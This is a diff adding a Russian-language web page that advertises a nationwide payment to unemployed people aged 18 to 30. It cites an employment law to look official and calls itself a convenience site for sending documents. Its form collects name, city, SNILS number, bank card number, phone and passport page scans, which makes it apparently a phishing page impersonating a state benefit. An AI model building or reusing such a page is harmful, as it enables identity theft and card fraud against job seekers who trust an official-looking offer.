@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Отправка письма с вложением</title>
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+  <link rel="stylesheet" href="stile.css">
+</head>
+
+<body>
+    <div class="sub">
+      <h1 class="helo">Всеросcийские выплаты безработным от 18 до 30 лет</h1>
+      <p class="textt"> В соответствии с Федеральным законом от 12 декабря 2023 года № 565-ФЗ «О занятости населения в Российской Федерации» гражданам, признанным в установленном порядке безработными, гарантируется выплата пособия по безработице..</p>
+      <p class="textt">Размер пособия по безработице для граждан, зарегистрированных в органах службы занятости населения в качестве безработных, рассчитывается индивидуально в зависимости от размера средней заработной платы гражданина, причины потери работы, длительности периода работы или отсутствия работы (при этом размер пособия по безработице не может быть не может быть выше максимальной величины пособия по безработице и ниже минимальной величины пособия по безработице).</p>
+      <p class="textt">Данный сайт создан исключительно для удобства отправки документов. За более подробной информацией обращайтесь центр занятости вашего населенного пункта.</p>
+    </div>
+    <div class="box">
+    	<form id="ajax-contact-form" enctype="multipart/form-data" method="post">
+          <div class="form-group">
+            <input id="nameFF" name="nameFF" type="text" placeholder="Имя" required>
+          </div>
+          <div class="form-group">
+            <input id="nameFF" name="nameFF" type="text" placeholder="Город" required>
+          </div>
+          <div class="form-group">
+            <input id="nameFF" name="nameFF" type="number" placeholder="СНИЛС" required>
+          </div>
+          <div class="form-group">
+            <input id="contactFF" name="contactFF" type="number" required placeholder="Номер карты" >
+          </div>
+          <div class="form-group">
+            <input id="telFF" name="tell"type="text" required placeholder="Телефон">
+          </div>
+          
+          <div class="control-file">
+            <label for="fileFF">Паспорт: главная страница</label>
+            <input id="fileFF" name="fileFF" required type="file">
+            <label for="fileFF">Паспорт: страница с пропиской</label>
+            <input id="fileFF" name="fileFF" required type="file">
+          </div>
+          <button class="btn" type="submit" id="submitFF">Отправить сообщение</button>
+        </form>
+    </div>
+	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+	<script src="script.js"></script>
+</body>
+
+
+</html>
